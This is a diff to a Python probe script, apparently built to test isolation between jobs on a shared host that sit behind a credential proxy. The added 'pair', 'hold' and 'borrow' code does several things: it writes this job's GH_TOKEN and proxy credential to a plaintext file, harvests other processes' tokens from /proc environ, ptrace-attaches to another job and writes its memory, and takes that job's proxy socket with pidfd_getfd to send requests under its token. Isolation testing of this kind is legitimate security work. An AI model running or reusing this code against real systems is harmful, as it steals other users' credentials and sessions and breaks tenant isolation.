@@ -14,6 +14,15 @@ usage: job.py bridge <fill|logins|get|askme> [timeout]   print the raw reply, ba
        job.py leftover <url> <seconds>                   leave a process behind this job that waits for a
                                                          later job marked J8B=1 and calls <url> with that
                                                          job's stand-in and proxy settings, read from /proc
+       job.py pair <url> <me> <other> <seconds>          one of two live jobs (J9=<me>): holds a CONNECT of its
+                                                         own open, then calls <url> with the other's proxy
+                                                         credential, stand-in or both, and from an address
+                                                         aliasing the other's held connection
+       job.py mint <url> <tag>                           call key-minting routes on <url> in several spellings
+       job.py reach <host> <port>                        every listener and socket this job can reach, by owner
+       job.py hold <url> <seconds>                       (J10=A) hold a CONNECT of this job's own open, idle
+       job.py borrow <url>                               from another job: ptrace the holder, write its memory,
+                                                         take its held connection with pidfd_getfd and use it
 Nothing here prints a secret in plain: replies are base64'd so only the harness reads them.
 """
 import base64
@@ -469,7 +478,15 @@ def pair(url, me, other, seconds):
     proxy_host, proxy_port, mine = proxy_parts(os.environ)
     held, said = connect_through((proxy_host, proxy_port), mine, target)
     rows = [f"HELD {said}"]
+    # The same as a file, as if it leaked some other way: where /proc does
+    # not give another job's environment, the rest still runs on it.
+    leak = os.path.expanduser(f"~/probe/pair-{me}.cred")
+    with open(leak + ".tmp", "w") as f:
+        json.dump({"HTTPS_PROXY": os.environ.get("HTTPS_PROXY", ""), "GH_TOKEN": os.environ.get("GH_TOKEN", ""),
+                   "port": held.getsockname()[1]}, f)
+    os.rename(leak + ".tmp", leak)
     victim = None
+    source = "environ"
     while time.time() < end and not victim:
         for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != os.getpid()]:
             try:
@@ -482,11 +499,16 @@ def pair(url, me, other, seconds):
             if "GH_TOKEN" in env and "HTTPS_PROXY" in env:
                 victim = (int(pid), env)
                 break
+        theirs_file = os.path.expanduser(f"~/probe/pair-{other}.cred")
+        if not victim and os.path.exists(theirs_file) and time.time() > end - float(seconds) + 6:
+            victim, source = (None, json.load(open(theirs_file))), "a leaked file (their /proc environ was refused)"
+            break
         time.sleep(0.3)
     if not victim:
         rows.append("NOOTHER")
     else:
         pid, theirs = victim
+        rows.append("FROM " + source.replace(" ", "_"))
         time.sleep(1.5)  # the other's held connection is open by now
         mine_env = dict(os.environ)
         cred_env = dict(os.environ, HTTPS_PROXY=theirs["HTTPS_PROXY"], https_proxy=theirs["HTTPS_PROXY"])
@@ -497,7 +519,7 @@ def pair(url, me, other, seconds):
         # The other's held connection: its local port, from the socket
         # table and the other job's own descriptors.
         inodes = set()
-        for fd in glob.glob(f"/proc/{pid}/task/*/fd/*") + glob.glob(f"/proc/{pid}/fd/*"):
+        for fd in ([] if pid is None else glob.glob(f"/proc/{pid}/task/*/fd/*") + glob.glob(f"/proc/{pid}/fd/*")):
             try:
                 link = os.readlink(fd)
             except Exception:
@@ -507,8 +529,9 @@ def pair(url, me, other, seconds):
         ports = []
         for row in open("/proc/net/tcp").read().splitlines()[1:]:
             f = row.split()
-            if f[2] == f"0100007F:{proxy_port:04X}" and f[9] in inodes:
+            if f[2] == f"0100007F:{proxy_port:04X}" and (f[9] in inodes or int(f[1].split(":")[1], 16) == theirs.get("port")):
                 ports.append(int(f[1].split(":")[1], 16))
+        ports = sorted(set(ports))
         _, _, theirs_cred = proxy_parts(theirs)
         got, tries = "none", 0
         for port in ports:
@@ -644,6 +667,82 @@ def reach(host, port):
         print(f"DOOR {type(e).__name__}")
 
 
+def hold(url, seconds):
+    """Job A of X9: a CONNECT to the bound origin with this job's own
+    credential, held open and idle, as a long fetch holds one."""
+    target = urllib.parse.urlsplit(url)
+    target = (target.hostname, target.port or 443)
+    host, port, mine = proxy_parts(os.environ)
+    held, said = connect_through((host, port), mine, target)
+    with open(os.path.expanduser("~/probe/x9-hold.out"), "w") as f:
+        f.write(f"HELD fd={held.fileno()} {said}\n")
+    time.sleep(float(seconds))
+    held.close()
+
+
+def borrow(url):
+    """Job B of X9, as the same user as job A: PTRACE_ATTACH on A's holder,
+    a write of one of its own bytes back into its memory through
+    /proc/<pid>/mem, and pidfd_getfd of the connection it holds to the
+    proxy, which is then used with A's stand-in. Statuses only."""
+    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+    libc.ptrace.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]
+    victim = None
+    for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != os.getpid()]:
+        try:
+            raw = open(f"/proc/{pid}/environ", "rb").read()
+            cmdline = open(f"/proc/{pid}/cmdline", "rb").read()
+        except Exception:
+            continue
+        if b"J10=A" in raw.split(b"\0") and b"hold" in cmdline.split(b"\0"):
+            victim = (int(pid), dict(kv.decode(errors="replace").split("=", 1) for kv in raw.split(b"\0") if b"=" in kv))
+    if not victim:
+        print("X9 NOVICTIM")
+        return
+    pid, theirs = victim
+    rows = []
+    if libc.ptrace(16, pid, None, None) == 0:  # PTRACE_ATTACH
+        os.waitpid(pid, 0x40000000)  # __WALL
+        libc.ptrace(17, pid, None, None)  # PTRACE_DETACH
+        rows.append("attach=ok")
+    else:
+        rows.append("attach=" + os.strerror(ctypes.get_errno()).replace(" ", "-"))
+    try:
+        start = next(int(line.split("-")[0], 16) for line in open(f"/proc/{pid}/maps") if line.split()[1].startswith("rw"))
+        with open(f"/proc/{pid}/mem", "r+b", buffering=0) as mem:
+            mem.seek(start)
+            byte = mem.read(1)
+            mem.seek(start)
+            mem.write(byte)
+        rows.append("memwrite=ok")
+    except Exception as e:
+        rows.append("memwrite=" + type(e).__name__)
+    target = urllib.parse.urlsplit(url)
+    target = (target.hostname, target.port or 443)
+    proxy_port = proxy_parts(theirs)[1]
+    table = open("/proc/net/tcp").read().splitlines()[1:]
+    got = "no-held-socket"
+    for fd in os.listdir(f"/proc/{pid}/fd"):
+        try:
+            link = os.readlink(f"/proc/{pid}/fd/{fd}")
+        except Exception:
+            continue
+        if not link.startswith("socket:[") or not any(
+                row.split()[2] == f"0100007F:{proxy_port:04X}" and row.split()[9] == link[8:-1] for row in table):
+            continue
+        pidfd = libc.syscall(434, pid, 0)  # pidfd_open
+        stolen = libc.syscall(438, pidfd, int(fd), 0) if pidfd >= 0 else -1  # pidfd_getfd
+        if stolen < 0:
+            got = "getfd=" + os.strerror(ctypes.get_errno()).replace(" ", "-")
+            break
+        s = socket.socket(fileno=stolen)
+        s.settimeout(8)
+        got = "getfd=ok,then-" + tls_get(s, target, "/x9-borrow", theirs.get("GH_TOKEN", ""))
+        break
+    rows.append("borrow=" + got)
+    print("X9 " + " ".join(rows))
+
+
 if __name__ == "__main__":
     cmd = sys.argv[1]
     if cmd == "bridge":
@@ -670,3 +769,7 @@ if __name__ == "__main__":
         mint(sys.argv[2], sys.argv[3])
     elif cmd == "reach":
         reach(sys.argv[2], sys.argv[3])
+    elif cmd == "hold":
+        hold(sys.argv[2], sys.argv[3])
+    elif cmd == "borrow":
+        borrow(sys.argv[2])
